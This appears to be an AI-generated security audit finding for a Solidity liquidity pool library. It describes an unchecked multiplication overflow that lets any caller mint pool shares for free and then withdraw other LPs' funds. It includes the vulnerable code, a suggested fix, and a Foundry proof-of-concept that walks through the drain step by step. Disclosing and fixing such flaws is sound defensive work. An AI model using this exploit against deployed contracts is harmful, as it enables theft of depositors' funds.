Now I have all the information needed. Let me trace the exact vulnerability path.

### Title
Unchecked uint256 Overflow in `LiquidityLib._checkedMul` Allows Free Share Minting and LP Fund Drain — (`metric-core/contracts/libraries/LiquidityLib.sol`)

---

### Summary

`_checkedMul` is a plain `a * b` multiplication with no overflow guard. It is called inside the `unchecked { }` block of `addLiquidity`. Because `sharesToAdd` is an unbounded `uint256`, an attacker can supply a value that causes the product `token0BalanceScaled * sharesToAdd` to silently wrap to a small number, making `amount0Scaled` compute to zero. The pool then records a dominant share position for the attacker without receiving any tokens, and the attacker can subsequently drain legitimate LP funds via `removeLiquidity`.

---

### Finding Description

**`_checkedMul` provides no overflow protection:** [1](#0-0) 

The function body is literally `return a * b;`. The name is misleading — there is no checked arithmetic here.

**The entire `addLiquidity` loop runs inside `unchecked`:** [2](#0-1) 

**The vulnerable multiplication (non-empty bin path):** [3](#0-2) 

- `binState.token0BalanceScaled` is `uint104` (max ≈ 2^104)
- `sharesToAdd` is `uint256` — no upper bound is enforced anywhere in the call path
- Inside `unchecked`, `token0BalanceScaled * sharesToAdd` silently wraps when the product exceeds 2^256

**Share and balance accounting diverge after the overflow:** [4](#0-3) 

When `amount0Scaled` rounds to zero:
- `binState.token0BalanceScaled` is **not** incremented (guarded by `if (amount0Scaled > 0)`)
- `binTotalShares[binIdx]` **is** incremented by the full `sharesToAdd`
- `positionBinShares[posKey]` **is** set to the full `sharesToAdd`

**The token-receipt guard is bypassed:** [5](#0-4) 

Because `totalToken0ToAddScaled == 0`, `amount0Added == 0`, so the `InsufficientTokenBalance` revert is never reached. The callback is not even invoked for token0.

**`removeLiquidity` drains legitimate LP funds:** [6](#0-5) 

The attacker holds a dominant share count. By choosing a `sharesToRemove` value that does not itself overflow (e.g., half their position), the division `V * sharesToRemove / binTotalSharesVal` yields a large fraction of the bin's real token balance, which is then transferred to the attacker.

---

### Impact Explanation

**Direct LP principal loss — Critical/High.**

Concrete example:
- Legitimate LP deposits, leaving `token0BalanceScaled = V ≈ 2^104`, `binTotalShares = S_legit`
- Attacker calls `addLiquidity` with `sharesToAdd = type(uint256).max / V + 1 ≈ 2^152`
- `_checkedMul(V, 2^152)` overflows → `amount0Scaled = 0` → attacker pays **0 tokens**
- `binTotalShares` becomes `S_legit + 2^152 ≈ 2^152`; attacker's position = `2^152`
- Attacker calls `removeLiquidity` with `sharesToRemove = 2^151` (chosen to avoid overflow in the remove path)
- `amount0Scaled = V * 2^151 / 2^152 = V/2` → attacker receives **~half the bin's token0 balance** for free
- Legitimate LPs' `token0BalanceScaled` and `binTotals.scaledToken0` are corrupted; their claims are undercollateralised

The attack is repeatable across both token legs and all non-empty bins.

---

### Likelihood Explanation

**High.** The entrypoint is the public `addLiquidity` function, callable by any address with no role restriction. `sharesToAdd` is a caller-supplied `uint256[]` with no cap. The only prerequisite is that a bin already has non-zero liquidity (`binTotalSharesVal > 0`), which is the normal operating state of any active pool. No privileged access, oracle manipulation, or non-standard token behaviour is required.

---

### Recommendation

Replace `_checkedMul` with a checked multiplication that reverts on overflow, or remove the `unchecked` wrapper from the share-amount computation. The simplest fix is to delete the `unchecked` block entirely and let Solidity 0.8's default overflow protection apply, or use OpenZeppelin `Math.mulDiv` for the proportional share calculation (as is already done in the `binTotalSharesVal == 0` branch at lines 94–106).

Specifically, lines 109–110 should use `Math.mulDiv`:
```solidity
amount0Scaled = Math.ceilDiv(
    Math.mulDiv(binState.token0BalanceScaled, sharesToAdd, binTotalSharesVal, Math.Rounding.Ceil),
    1
);
// or simply:
amount0Scaled = Math.mulDiv(binState.token0BalanceScaled, sharesToAdd, binTotalSharesVal, Math.Rounding.Ceil);
```

The same fix applies to the `removeLiquidity` path at lines 205–206 and to the `binTotalSharesVal == 0` branches at lines 87–89 that also call `_checkedMul` inside `unchecked`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
// ... standard pool fixture setup ...

function test_overflow_freeShareMint() public {
    // Step 1: Legitimate LP seeds the bin
    uint104 legitShares = 1_000_000;
    _doAddLiquidity(LEGIT_LP, DEFAULT_SALT, _createDelta(TARGET_BIN, legitShares));

    // Read current bin state
    uint104 V = pool.getBinState(TARGET_BIN).token0BalanceScaled; // e.g. ~1e18 scaled

    // Step 2: Attacker computes overflow trigger
    uint256 sharesToAdd = type(uint256).max / uint256(V) + 1;

    // Step 3: Attacker adds liquidity — expects to pay 0 tokens
    (uint256 a0, uint256 a1) = _doAddLiquidity(ATTACKER, ATTACKER_SALT, _createDelta(TARGET_BIN, sharesToAdd));
    assertEq(a0, 0, "Attacker paid zero token0");
    assertEq(a1, 0, "Attacker paid zero token1");

    // Attacker holds dominant position
    uint256 attackerShares = pool.getPositionBinShares(ATTACKER, ATTACKER_SALT, TARGET_BIN);
    assertGt(attackerShares, legitShares, "Attacker dominates bin");

    // Step 4: Attacker removes half their shares (avoids overflow in remove path)
    uint256 removeShares = sharesToAdd / 2;
    (uint256 r0,) = _doRemoveLiquidity(ATTACKER, ATTACKER_SALT, _createDelta(TARGET_BIN, removeShares));

    // Attacker drains ~half the bin's real token0 balance
    assertGt(r0, uint256(V) / 3, "Attacker drained significant token0");

    // Legitimate LP's claim is now undercollateralised
    (uint256 lp0,) = _doRemoveLiquidity(LEGIT_LP, DEFAULT_SALT, _createDelta(TARGET_BIN, legitShares));
    assertLt(lp0, uint256(V) / 2, "Legit LP lost principal");
}
```

### Citations

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L51-51)
```text
    unchecked {
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L109-110)
```text
            amount0Scaled = Math.ceilDiv(_checkedMul(binState.token0BalanceScaled, sharesToAdd), binTotalSharesVal);
            amount1Scaled = Math.ceilDiv(_checkedMul(binState.token1BalanceScaled, sharesToAdd), binTotalSharesVal);
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L112-121)
```text
          if (amount0Scaled > 0) {
            totalToken0ToAddScaled += amount0Scaled;
            binState.token0BalanceScaled = (uint256(binState.token0BalanceScaled) + amount0Scaled).toUint104();
          }
          if (amount1Scaled > 0) {
            totalToken1ToAddScaled += amount1Scaled;
            binState.token1BalanceScaled = (uint256(binState.token1BalanceScaled) + amount1Scaled).toUint104();
          }
          binTotalShares[binIdx] = binTotalSharesVal + sharesToAdd;
          positionBinShares[posKey] = newUserShares;
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L144-154)
```text
      if (amount0Added > 0 || amount1Added > 0) {
        uint256 balance0Before = IERC20(ctx.token0).balanceOf(address(this));
        uint256 balance1Before = IERC20(ctx.token1).balanceOf(address(this));
        IMetricOmmModifyLiquidityCallback(msg.sender)
          .metricOmmModifyLiquidityCallback(amount0Added, amount1Added, callbackData);
        if (amount0Added > 0 && balance0Before + amount0Added > IERC20(ctx.token0).balanceOf(address(this))) {
          revert IMetricOmmPoolActions.InsufficientTokenBalance();
        }
        if (amount1Added > 0 && balance1Before + amount1Added > IERC20(ctx.token1).balanceOf(address(this))) {
          revert IMetricOmmPoolActions.InsufficientTokenBalance();
        }
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L205-206)
```text
          uint256 amount0Scaled = _checkedMul(binState.token0BalanceScaled, sharesToRemove) / binTotalSharesVal;
          uint256 amount1Scaled = _checkedMul(binState.token1BalanceScaled, sharesToRemove) / binTotalSharesVal;
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L261-263)
```text
  function _checkedMul(uint256 a, uint256 b) internal pure returns (uint256) {
    return a * b;
  }
```
